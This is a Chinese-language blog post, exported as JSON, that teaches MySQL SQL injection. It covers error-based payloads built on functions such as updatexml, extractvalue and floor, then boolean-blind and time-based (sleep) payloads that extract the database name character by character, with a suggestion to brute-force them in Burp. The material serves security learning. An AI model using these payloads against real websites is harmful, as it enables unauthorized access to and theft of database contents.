{"title":"SQL注入其二","uid":"c35bf4cdcf9610d9342e4b2e541833f0","slug":"SQL注入其二","date":"2023-01-15T07:43:08.000Z","updated":"2023-01-15T07:55:54.688Z","comments":true,"path":"api/articles/SQL注入其二.json","keywords":null,"cover":null,"content":"<p><strong>1.</strong> <strong>报错注入</strong></p>\n<p>mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果</p>\n<p><strong>报错注入常用函数</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1.floor()\n\nselect * from test where id&#x3D;1 and (select 1 from (select count(*),concat((select\n\nuser()),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n2.extractvalue()\n\nselect * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select\n\nuser()),0x7e)));\n\n3.updatexml()\n\nselect * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select\n\nuser()),0x7e),1));\n\n4.geometrycollection()\n\nselect * from test where id&#x3D;1 and geometrycollection((select * from(select *\n\nfrom(select user())a)b));\n\n5.multipoint()\n\nselect * from test where id&#x3D;1 and multipoint((select * from(select * from(select\n\nuser())a)b));\n\n6.polygon()\n\nselect * from test where id&#x3D;1 and polygon((select * from(select * from(select\n\nuser())a)b));\n\n7.multipolygon()\n\nselect * from test where id&#x3D;1 and multipolygon((select * from(select *\n\nfrom(select user())a)b));\n\n8.linestring()\n\nselect * from test where id&#x3D;1 and linestring((select * from(select * from(select\n\nuser())a)b));\n\n9.multilinestring()\n\nselect * from test where id&#x3D;1 and multilinestring((select * from(select *\n\nfrom(select user())a)b));\n\n10.exp()\n\nselect * from test where id&#x3D;1 and exp(~(select * from(select user())a));<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>2.</strong> <strong>布尔盲注</strong></p>\n<p>布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息，单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来，判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了</p>\n<p>查询数据内容</p>\n<p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p>\n<p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p>\n<p>and length(database())&#x3D;8 – + # 判断当前数据库名长度</p>\n<p>substr() \\ left() 函数 截取查询结果字符进行判断</p>\n<p>and substr(database(),1,1)&#x3D;’a’ – + # 使用指定字符一位一位判断截取到的字符</p>\n<p>and left(database(),8)&#x3D;’security’ – + # 截取指定长度结果，进行判断</p>\n<p># 可使用ascii函数，查询截取到字符的ascii码</p>\n<p>ascii(substr(database(),1,1))&#x3D;115 – + # 使用ascii码一位一位比对截取到的字符</p>\n<p>然后用burp盲注爆破</p>\n<p><strong>3.</strong> <strong>延时注入</strong></p>\n<p>延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断，sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p>\n<p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了</p>\n<p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p>\n<p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p>\n<p>and if(length(database()) &#x3D; 8, sleep(3),1) – + # 判断当前数据库名长度</p>\n<p>同布尔盲注可用burp进行延时注入的爆破，虽然burp爆破的方式可以实现注入，但结果不利于信息的获取，可利用注入脚本进行操作</p>\n","text":"1. 报错注入 mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"test","uid":"bc567916c4dc0d8169bd26d18e348d36","slug":"test","date":"2023-02-04T11:11:09.000Z","updated":"2023-02-06T11:18:22.803Z","comments":true,"path":"api/articles/test.json","keywords":null,"cover":[],"text":" ","link":"","photos":[],"count_time":{"symbolsCount":1,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"SQL注入其一","uid":"50f911bc61e762a93882fb5a0615065b","slug":"SQL注入其一","date":"2023-01-14T01:50:00.000Z","updated":"2023-01-14T01:57:10.784Z","comments":true,"path":"api/articles/SQL注入其一.json","keywords":null,"cover":null,"text":"1.SQL注入流程 得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方（且参数可控）一般在三个地方寻找注入点：(1)表单中的输入参数 (2)URL中的参数 (3) Cookie或header头中其它参数 2.测试注入点&amp;...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}